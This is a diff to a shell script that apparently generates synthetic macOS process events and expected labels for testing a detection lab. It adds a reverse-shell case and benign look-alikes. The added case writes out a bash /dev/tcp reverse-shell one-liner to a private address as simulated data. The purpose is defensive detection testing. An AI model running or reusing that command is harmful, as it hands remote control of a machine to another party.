@@ -217,6 +217,7 @@ ev_fork() {
 ENV_JSON='["HOME=/Users/learner","LANG=C.UTF-8","LOGNAME=learner","PATH=/usr/local/bin:/usr/bin:/bin","SHELL=/bin/zsh","USER=learner"]'
 FDS_tty='[{"fd":0,"fdtype":1},{"fd":1,"fdtype":1},{"fd":2,"fdtype":1}]'
 FDS_pipe='[{"fd":0,"fdtype":6,"pipe":{"pipe_id":100231}},{"fd":1,"fdtype":1},{"fd":2,"fdtype":1}]'
+FDS_socket='[{"fd":0,"fdtype":2},{"fd":1,"fdtype":2},{"fd":2,"fdtype":2}]'
 EXEC_SCRIPT=''   # set before ev_exec for a script run through its interpreter; reset by it
 EXEC_IDS=''      # "ruid euid rgid egid" set before ev_exec for a setuid program; reset by it
 
@@ -526,6 +527,28 @@ synthetic_story() {
   ev_exit 100.4 "$curl"
   run_as 101.1 "$ZSH" 7651 9651 "$LAB/stage2" adhoc stage2-55554944f0be3f1f '' stage2 --run
   answer dropped dropped-then-executed high queued 'stage2 --run' 'A program written by curl runs a second later from the staging folder, and it is ad-hoc signed: fetch, then run.'
+
+  # 14. A program in the staging folder opens a reverse shell: sh -c wires bash -i to a TCP connection, so bash reads
+  #     its commands from a socket.
+  local svc sh rbash
+  ev_fork 105.0 "$ZSH" 7660 9660; svc=$LAST
+  ev_exec 105.1 "$svc" "$LAB/netsvc" adhoc netsvc-55554944f0be3f1f '' "$CWD" tty netsvc
+  ev_fork 105.5 "$svc" 7661 9661; sh=$LAST
+  ev_exec 105.6 "$sh" /bin/sh platform com.apple.sh '' "$CWD" tty sh -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'
+  ev_fork 105.7 "$sh" 7662 9662; rbash=$LAST
+  ev_exec 105.8 "$rbash" /bin/bash platform com.apple.bash '' "$CWD" socket /bin/bash -i
+  answer reverse-shell reverse-shell high queued 'dev/tcp/192.168.56.10' 'sh -c sends bash -i to a TCP connection and takes its input from there: a reverse shell, set up on the command line.'
+  answer reverse-shell reverse-shell high queued '/bin/bash -i' 'The bash it starts reads its commands from a socket: the reverse shell itself, whatever command line made it.'
+
+  #     Two look-alikes that are not reverse shells: a wait-for-database port check, and git started by a node tool
+  #     with a socket for its input (as Node and Electron start child processes).
+  run 106.0 "$ZSH" 7663 9663 /bin/bash bash -c '</dev/tcp/localhost/5432'
+  local node git
+  ev_fork 107.0 "$ZSH" 7664 9664; node=$LAST
+  ev_exec 107.1 "$node" /opt/homebrew/bin/node team org.nodejs.node LAB0NODE01 "$CWD" tty node tools/watch.js
+  ev_fork 107.5 "$node" 7665 9665; git=$LAST
+  ev_exec 107.6 "$git" /usr/bin/git platform com.apple.git '' "$CWD" socket git status --porcelain
+  ev_exit 107.9 "$git"
 }
 
 # ---- live mode --------------------------------------------------------------------------------------------------
@@ -551,7 +574,8 @@ live_answers() {
     '#   apple-masquerade: the lab will not write a com.apple launch plist, and an unsigned program will not run.' \
     '#   clickfix-paste-chain: the lab will not fetch with curl -k or a custom user agent, or run what it decodes.' \
     '#   risky-parent-spawn for Script Editor, Office and developer tools: the lab opens none of them (only its applet).' \
-    '#   persistence-item med on its own row: needs an app'"'"'s own launch agent.' >&4
+    '#   persistence-item med on its own row: needs an app'"'"'s own launch agent.' \
+    '#   reverse-shell: the lab opens no reverse shell, even to loopback, so endpoint protection is not set off.' >&4
   answer download download med queued 'file:///etc/hosts' 'curl saves a file to disk (from /etc/hosts, so no network is used).'
   answer pipe shell-from-pipe med queued 'bash -s' 'bash runs commands piped into it: no script file on disk to inspect.'
   answer pipe-whoami recon low in-chain whoami 'whoami under the piped bash: in a flagged chain.'
